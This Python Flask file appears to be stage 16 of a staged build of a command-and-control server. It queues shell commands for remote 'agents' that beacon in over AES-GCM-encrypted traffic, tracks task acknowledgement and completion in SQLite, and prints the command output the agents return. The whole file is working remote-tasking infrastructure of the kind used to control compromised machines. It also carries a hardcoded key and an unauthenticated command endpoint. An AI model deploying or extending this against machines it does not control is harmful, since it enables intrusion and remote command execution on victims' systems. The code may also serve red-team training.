"""
SERVER — Stage 16 (Reliable Task Delivery — ACK System)

Matches: agent/stages/stage16_reliable.go

What this adds:
- Task ACK: agent confirms it received the task
- Task lifecycle: queued → sent → ack → completed
- Duplicate delivery prevention (same task not re-sent after ACK)
- SQLite database replaces in-memory dicts
"""

import base64, json, os, uuid, sqlite3
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from datetime import datetime

app = Flask(__name__)

SECRET_KEY = b"01234567890123456789012345678901"
DB_FILE    = "stage16.db"

# ── Crypto ─────────────────────────────────────────────────────

def encrypt(data):
    aes = AESGCM(SECRET_KEY); nonce = os.urandom(12)
    return base64.b64encode(nonce + aes.encrypt(nonce, json.dumps(data).encode(), None)).decode()

def decrypt(enc):
    raw = base64.b64decode(enc)
    return json.loads(AESGCM(SECRET_KEY).decrypt(raw[:12], raw[12:], None).decode())

# ── Database ────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(DB_FILE)
    conn.execute('''CREATE TABLE IF NOT EXISTS agents (
        agent_id TEXT PRIMARY KEY, hostname TEXT, last_seen TEXT)''')
    conn.execute('''CREATE TABLE IF NOT EXISTS tasks (
        task_id TEXT PRIMARY KEY, agent_id TEXT,
        command TEXT, status TEXT, output TEXT,
        created_at TEXT)''')
    conn.commit(); conn.close()

def get_pending_task(agent_id):
    conn = sqlite3.connect(DB_FILE)
    row  = conn.execute(
        "SELECT task_id, command FROM tasks WHERE agent_id=? AND status='queued' LIMIT 1",
        (agent_id,)).fetchone()
    conn.close()
    return {"id": row[0], "cmd": row[1]} if row else None

# ── Routes ─────────────────────────────────────────────────────

@app.route("/beacon", methods=["POST"])
def beacon():
    payload  = decrypt(request.json["data"])
    agent_id = payload.get("agent_id")
    if not agent_id:
        return jsonify({"error": "missing agent_id"}), 400

    now  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn = sqlite3.connect(DB_FILE)

    conn.execute("INSERT OR REPLACE INTO agents VALUES (?,?,?)",
                 (agent_id, payload.get("hostname", "?"), now))

    # Handle ACK
    if payload.get("ack"):
        conn.execute("UPDATE tasks SET status='ack' WHERE task_id=?", (payload["ack"],))
        print(f"[✓] ACK received for task {payload['ack']}")

    # Handle output
    if payload.get("output") and payload.get("task_id"):
        conn.execute("UPDATE tasks SET status='completed', output=? WHERE task_id=?",
                     (payload["output"], payload["task_id"]))
        print(f"\n[OUTPUT task={payload['task_id']}]\n{payload['output']}\n{'='*40}")

    conn.commit(); conn.close()

    # Dispatch next task
    task = get_pending_task(agent_id)
    if task:
        conn = sqlite3.connect(DB_FILE)
        conn.execute("UPDATE tasks SET status='sent' WHERE task_id=?", (task["id"],))
        conn.commit(); conn.close()
        print(f"[→] Sending task {task['id']} to {agent_id}: {task['cmd']}")

    return jsonify({"data": encrypt({"task": task})})

@app.route("/command", methods=["POST"])
def queue_command():
    data = request.get_json()
    tid  = str(uuid.uuid4())
    conn = sqlite3.connect(DB_FILE)
    conn.execute("INSERT INTO tasks VALUES (?,?,?,'queued',?,?)",
                 (tid, data["agent_id"], data["cmd"], None,
                  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit(); conn.close()
    print(f"[*] Task queued: {data['cmd']} -> {data['agent_id']}")
    return jsonify({"task_id": tid})

@app.route("/agents")
def list_agents():
    conn  = sqlite3.connect(DB_FILE)
    rows  = conn.execute("SELECT * FROM agents").fetchall()
    conn.close()
    return jsonify([{"agent_id": r[0], "hostname": r[1], "last_seen": r[2]} for r in rows])

init_db()

if __name__ == "__main__":
    print("[*] Stage 16 server started — reliable ACK-based delivery")
    app.run(host="0.0.0.0", port=8080, debug=False)
